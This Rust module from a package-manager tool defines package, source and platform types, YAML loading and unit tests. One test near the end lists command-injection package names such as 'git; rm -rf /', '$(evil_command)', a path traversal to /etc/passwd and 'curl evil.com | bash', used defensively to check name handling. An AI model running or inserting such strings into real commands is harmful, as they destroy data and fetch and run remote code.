use crate::SantaConfig;
use std::{collections::HashMap, fs, path::Path};

use anyhow::Context;
use serde::{Deserialize, Serialize};
use serde_enum_str::{Deserialize_enum_str, Serialize_enum_str};
use tracing::{error, info};

use crate::{sources::PackageSource, traits::Exportable};

pub mod constants;

#[derive(Serialize_enum_str, Deserialize_enum_str, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
pub enum KnownSources {
    Apt,
    Aur,
    Brew,
    Cargo,
    Pacman,
    Scoop,
    Nix,
    #[serde(other)]
    Unknown(String),
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
pub enum OS {
    Macos,
    Linux,
    Windows,
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
pub enum Arch {
    X64,
    Aarch64,
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
pub enum Distro {
    None,
    ArchLinux,
    Ubuntu,
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
pub struct Platform {
    pub os: OS,
    pub arch: Arch,
    pub distro: Option<Distro>,
}

impl Default for Platform {
    fn default() -> Self {
        Platform {
            os: OS::Linux,
            arch: Arch::X64,
            distro: None,
        }
    }
}

impl std::fmt::Display for Platform {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match &self.distro {
            Some(distro) => {
                write!(f, "{:?} {:?} ({:?})", self.os, self.arch, distro)
            }
            None => {
                write!(f, "{:?} {:?}", self.os, self.arch)
            }
        }
    }
}

impl Platform {
    pub fn current() -> Self {
        let family = std::env::consts::FAMILY;
        let os = std::env::consts::OS;
        let arch = std::env::consts::ARCH;
        let mut platform: Platform = Platform::default();

        if family == "windows" {
            platform.os = OS::Windows;
        } else {
            match os {
                "macos" | "ios" => {
                    platform.os = OS::Macos;
                }
                "windows" => {
                    // unnecessary
                    platform.os = OS::Windows;
                }
                _ => platform.os = OS::Linux,
            }
        }

        match arch {
            "x86_64" => platform.arch = Arch::X64,
            "aarch64" => platform.arch = Arch::Aarch64,
            _ => panic!("Unsupported architecture: {}", arch),
        }

        platform
    }
}

pub trait LoadFromFile {
    fn load_from(file: &Path) -> Self
    where
        Self: Sized,
    {
        info!("Loading data from: {}", file.display());
        if !file.exists() {
            error!("Can't find data file: {}", file.display());
        }
        let yaml_str = fs::read_to_string(file)
            .with_context(|| format!("Failed to read file: {}", file.display()))
            .expect("Failed to read data file");
        LoadFromFile::load_from_str(&yaml_str)
    }

    fn load_from_str(yaml_str: &str) -> Self
    where
        Self: Sized;
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PackageData {
    /// Name of the package
    name: Option<String>,
    /// A command to run BEFORE installing the package
    pub before: Option<String>,
    /// A command to run AFTER installing the package
    pub after: Option<String>,
    /// A string to prepend to the install string
    pub pre: Option<String>,
    /// A string to postpend to the install string
    pub post: Option<String>,
    // Sources that can install this package
    // pub sources: Option<Vec<String>>,
}

impl PackageData {
    pub fn new(name: &str) -> Self {
        PackageData {
            name: Some(name.to_string()),
            before: None,
            after: None,
            pre: None,
            post: None,
            // sources: None,
        }
    }
}

/// A map of package names (strings)
pub type PackageDataList = HashMap<String, HashMap<KnownSources, Option<PackageData>>>;

impl LoadFromFile for PackageDataList {
    fn load_from_str(yaml_str: &str) -> Self {
        let data: PackageDataList = match serde_yaml::from_str(yaml_str) {
            Ok(data) => data,
            Err(e) => {
                error!("Error loading data: {}", e);
                error!("Using default empty data");
                PackageDataList::new() // Return empty HashMap instead of recursion
            }
        };
        data
    }
}

impl Exportable for PackageDataList {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        let list: Vec<String> = self.keys().map(|key| key.to_string()).collect();

        serde_yaml::to_string(&list).expect("Failed to serialize list")
    }
}

pub type SourceList = Vec<PackageSource>;

impl LoadFromFile for SourceList {
    fn load_from_str(yaml_str: &str) -> Self {
        let data: SourceList =
            serde_yaml::from_str(yaml_str).expect("Failed to deserialize source list");
        data
    }
}

impl Exportable for SourceList {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        let list: Vec<String> = self.iter().map(|source| format!("{}", source)).collect();

        serde_yaml::to_string(&list).expect("Failed to serialize source list")
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SantaData {
    pub packages: PackageDataList,
    pub sources: SourceList,
}

impl SantaData {
    pub fn load_from_str(packages_str: &str, sources_str: &str) -> Self {
        let packages = PackageDataList::load_from_str(packages_str);
        let sources = SourceList::load_from_str(sources_str);
        SantaData { packages, sources }
    }

    // pub fn update_from_config(&mut self, config: &SantaConfig) {
    pub fn sources(&self, config: &SantaConfig) -> SourceList {
        if config.sources.is_empty() {
            self.sources.clone()
        } else {
            let mut ret: SourceList = self.sources.clone();
            ret.extend(self.sources.clone());
            ret
        }
    }

    pub fn name_for(&self, package: &str, source: &PackageSource) -> String {
        match self.packages.get(package) {
            #[allow(clippy::collapsible_match)]
            Some(sources) => match sources.get(&source.name) {
                Some(pkgs) => match pkgs {
                    Some(name) => name
                        .name
                        .as_ref()
                        .map(|s| s.to_string())
                        .unwrap_or_else(|| source.adjust_package_name(package)),
                    None => source.adjust_package_name(package),
                },
                None => source.adjust_package_name(package),
            },
            None => source.adjust_package_name(package),
        }
    }
}

impl Default for SantaData {
    fn default() -> Self {
        SantaData::load_from_str(constants::BUILTIN_PACKAGES, constants::BUILTIN_SOURCES)
    }
}

impl Exportable for SantaData {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        serde_yaml::to_string(&self).expect("Failed to serialize SantaData")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_known_sources_serialization() {
        // Test that KnownSources enum serializes correctly
        let sources = vec![
            KnownSources::Apt,
            KnownSources::Brew,
            KnownSources::Cargo,
            KnownSources::Unknown("custom".to_string()),
        ];

        for source in sources {
            let serialized = serde_yaml::to_string(&source).unwrap();
            let deserialized: KnownSources = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(source, deserialized);
        }
    }

    #[test]
    fn test_platform_current_detection() {
        let platform = Platform::current();

        // Basic sanity checks - these should always pass
        assert!(matches!(platform.os, OS::Linux | OS::Macos | OS::Windows));
        assert!(matches!(platform.arch, Arch::X64 | Arch::Aarch64));

        // Test platform display
        let display_str = format!("{}", platform);
        assert!(!display_str.is_empty());

        // Test that current platform detection is consistent
        let platform2 = Platform::current();
        assert_eq!(platform.os, platform2.os);
        assert_eq!(platform.arch, platform2.arch);
    }

    #[test]
    fn test_platform_display() {
        let platform_with_distro = Platform {
            os: OS::Linux,
            arch: Arch::X64,
            distro: Some(Distro::Ubuntu),
        };

        let platform_without_distro = Platform {
            os: OS::Macos,
            arch: Arch::Aarch64,
            distro: None,
        };

        let display_with = format!("{}", platform_with_distro);
        let display_without = format!("{}", platform_without_distro);

        assert!(display_with.contains("Linux"));
        assert!(display_with.contains("X64"));
        assert!(display_with.contains("Ubuntu"));

        assert!(display_without.contains("Macos"));
        assert!(display_without.contains("Aarch64"));
        assert!(!display_without.contains("Ubuntu"));
    }

    #[test]
    fn test_package_data_creation() {
        let pkg_data = PackageData::new("git");
        assert_eq!(pkg_data.name, Some("git".to_string()));
        assert!(pkg_data.before.is_none());
        assert!(pkg_data.after.is_none());
        assert!(pkg_data.pre.is_none());
        assert!(pkg_data.post.is_none());
    }

    #[test]
    fn test_santa_data_name_for() {
        // Create test data
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        git_sources.insert(KnownSources::Apt, None);
        packages.insert("git".to_string(), git_sources);

        let sources = SourceList::new();
        let data = SantaData { packages, sources };

        // Create test source
        let brew_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix.".to_string()),
            None,
        );

        // Test name resolution
        let name = data.name_for("git", &brew_source);
        assert_eq!(name, "git"); // Should use the stored name, not the adjusted one

        // Test with non-existent package
        let name_missing = data.name_for("nonexistent", &brew_source);
        assert_eq!(name_missing, "prefix.nonexistent"); // Should use source's adjust_package_name
    }

    #[test]
    fn test_package_data_list_serialization() {
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        packages.insert("git".to_string(), git_sources);

        // Test export_min functionality
        let exported = packages.export_min();
        assert!(exported.contains("git"));

        // Should be a YAML list of package names
        let deserialized: Vec<String> = serde_yaml::from_str(&exported).unwrap();
        assert!(deserialized.contains(&"git".to_string()));
    }

    #[test]
    fn test_santa_data_default() {
        let data = SantaData::default();

        // Default data should have some packages and sources
        assert!(!data.packages.is_empty());
        assert!(!data.sources.is_empty());

        // Should be able to export
        let exported = data.export();
        assert!(!exported.is_empty());
    }

    #[test]
    fn test_load_from_file_error_handling() {
        // Test error handling in LoadFromFile trait
        let invalid_yaml = "invalid: yaml: content: [";

        // This should return empty data on error to prevent recursion
        let result = PackageDataList::load_from_str(invalid_yaml);
        assert!(result.is_empty()); // Should return empty data on error
    }

    #[test]
    fn test_security_package_names() {
        // Test that various dangerous package names are handled
        let dangerous_names = vec![
            "git; rm -rf /",
            "$(evil_command)",
            "`dangerous`",
            "../../../etc/passwd",
            "package && curl evil.com | bash",
        ];

        let mut packages = PackageDataList::new();
        for name in &dangerous_names {
            let mut sources = HashMap::new();
            sources.insert(KnownSources::Brew, Some(PackageData::new(name)));
            packages.insert(name.to_string(), sources);
        }

        let data = SantaData {
            packages,
            sources: SourceList::new(),
        };

        // Test that package names are preserved (they should be sanitized during execution)
        for name in &dangerous_names {
            assert!(data.packages.contains_key(&name.to_string()));
        }

        // Test export with dangerous names
        let exported = data.export();
        assert!(!exported.is_empty());

        // Test name_for with dangerous source
        let source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew; rm -rf /",
            "brew install",
            "brew list",
            None,
            None,
        );

        for name in &dangerous_names {
            let resolved = data.name_for(name, &source);
            // Should return the name as-is - sanitization should happen at execution time
            assert!(!resolved.is_empty());
        }
    }
}
